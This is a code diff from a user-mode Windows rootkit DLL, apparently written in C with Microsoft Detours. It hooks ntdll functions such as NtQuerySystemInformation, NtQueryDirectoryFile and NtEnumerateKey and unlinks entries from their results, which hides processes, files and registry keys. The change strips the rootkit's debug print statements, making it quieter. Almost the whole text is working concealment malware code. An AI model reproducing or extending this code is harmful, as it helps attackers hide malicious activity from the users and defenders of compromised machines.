@@ -47,7 +47,6 @@ NTSTATUS MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationCl
                 }
                 else {
                     Previous->NextEntryOffset += Current->NextEntryOffset;
-                    PRINT("(+) NtQuerySystemInformation Used...\n");
                 }
                 Current = Previous;
             }
@@ -89,7 +88,6 @@ NTSTATUS MyNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE
                 if (next->NextEntryOffset != 0) {
                     next = (PFILE_ID_BOTH_DIR_INFO)((LPBYTE)next + next->NextEntryOffset);
                     current->NextEntryOffset += next->NextEntryOffset;
-                    PRINT("(+) NtQueryDirectoryFile Used...\n");
                 }
                 else {
                     current->NextEntryOffset = 0;
@@ -132,7 +130,6 @@ NTSTATUS MyNtQueryDirectoryFileEx(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTI
                 if (next->NextEntryOffset != 0) {
                     next = (PFILE_ID_BOTH_DIR_INFO)((LPBYTE)next + next->NextEntryOffset);
                     current->NextEntryOffset += next->NextEntryOffset;
-                    PRINT("(+) NtQueryDirectoryFileEx Used...\n");
                 }
                 else {
                     current->NextEntryOffset = 0;
@@ -247,15 +244,14 @@ VOID InstallHook(LPCSTR dll, LPCSTR function, LPVOID* originalFunction, LPVOID h
     *originalFunction = GetProcAddress(GetModuleHandleA(dll), function);
     if (*originalFunction)
         DetourAttach(originalFunction, hookedFunction);
-    PRINT("(I) Hook Initiated...\n");
-
+    
 }
 
 VOID Unhook(LPVOID* originalFunction, LPVOID hookedFunction) {
 
     if (*originalFunction)
         DetourDetach(originalFunction, hookedFunction);
-    PRINT("(I) Hook Uninitiated...\n");
+    
 }
 
 VOID InitializeHooks() {
@@ -268,7 +264,6 @@ VOID InitializeHooks() {
     InstallHook("ntdll.dll", "NtEnumerateKey", (LPVOID)&g_NtEnumerateKey, MyNtEnumerateKey);
     InstallHook("ntdll.dll", "NtEnumerateValueKey", (LPVOID)&g_NtEnumerateValueKey, MyNtEnumerateValueKey);
     DetourTransactionCommit();
-    PRINT("(I) NtQuerySystemInformation -> 0x%p\n(I) NtQueryDirectoryFile -> 0x%p\n", g_NtQuerySystemInformation, g_NtQueryDirectoryFile);
 
     TlsNtEnumerateKeyCacheKey = TlsAlloc();
     TlsNtEnumerateKeyCacheIndex = TlsAlloc();
@@ -317,7 +312,6 @@ BOOL WINAPI DllMain(HINSTANCE hModule, DWORD  fdwReason, LPVOID lpReserved) {
     }
     if (fdwReason == DLL_PROCESS_DETACH) {
         UninitializeHooks();
-        PRINT("(-) Detaching Rootkit...\n");
     }
 
     return TRUE;
